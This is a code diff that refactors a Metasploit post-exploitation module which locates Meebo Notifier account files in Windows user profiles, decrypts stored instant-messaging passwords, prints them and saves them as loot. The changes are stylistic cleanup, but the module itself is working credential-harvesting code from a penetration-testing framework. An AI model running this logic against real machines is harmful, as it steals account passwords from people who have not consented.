@@ -33,6 +33,11 @@ class MetasploitModule < Msf::Post
               stdapi_fs_stat
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -40,8 +45,10 @@ class MetasploitModule < Msf::Post
 
   def run
     grab_user_profiles.each do |user|
-      accounts = user['AppData'] + '\\Meebo\\MeeboAccounts.txt'
       next if user['AppData'].nil?
+
+      accounts = user['AppData'] + '\\Meebo\\MeeboAccounts.txt'
+
       next if accounts.empty?
 
       stat = begin
@@ -75,18 +82,28 @@ class MetasploitModule < Msf::Post
       protocol = ::Regexp.last_match(2).to_i
       username = ::Regexp.last_match(3)
     else
-      print_error('Regex failed...')
+      print_error('Could not extract credentials from file')
       return
     end
 
-    protocol = 'Meebo' if protocol == 0
-    protocol = 'AIM' if protocol == 1
-    protocol = 'Yahoo IM' if protocol == 2
-    protocol = 'Windows Live' if protocol == 3
-    protocol = 'Google Talk' if protocol == 4
-    protocol = 'ICQ' if protocol == 5
-    protocol = 'Jabber' if protocol == 6
-    protocol = 'Myspace IM' if protocol == 7
+    case protocol
+    when 0
+      protocol = 'Meebo'
+    when 1
+      protocol = 'AIM'
+    when 2
+      protocol = 'Yahoo IM'
+    when 3
+      protocol = 'Windows Live'
+    when 4
+      protocol = 'Google Talk'
+    when 5
+      protocol = 'ICQ'
+    when 6
+      protocol = 'Jabber'
+    when 7
+      protocol = 'Myspace IM'
+    end
 
     passwd = decrypt(epass)
     print_good("*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***")
@@ -95,19 +112,21 @@ class MetasploitModule < Msf::Post
 
     if passwd.nil? || username.nil?
       print_status('Meebo credentials have not been found')
-    else
-      print_status('Storing data...')
-      path = store_loot(
-        'meebo.user.creds',
-        'text/csv',
-        session,
-        creds.to_csv,
-        'meebo_user_creds.csv',
-        'Meebo Notifier User Credentials'
-      )
-      print_good("Meebo Notifier user credentials saved in: #{path}")
+      return
     end
-  rescue ::Exception => e
+
+    print_status('Storing data...')
+    path = store_loot(
+      'meebo.user.creds',
+      'text/csv',
+      session,
+      creds.to_csv,
+      'meebo_user_creds.csv',
+      'Meebo Notifier User Credentials'
+    )
+
+    print_good("Meebo Notifier user credentials saved in: #{path}")
+  rescue StandardError => e
     print_error("An error has occurred: #{e}")
   end
 
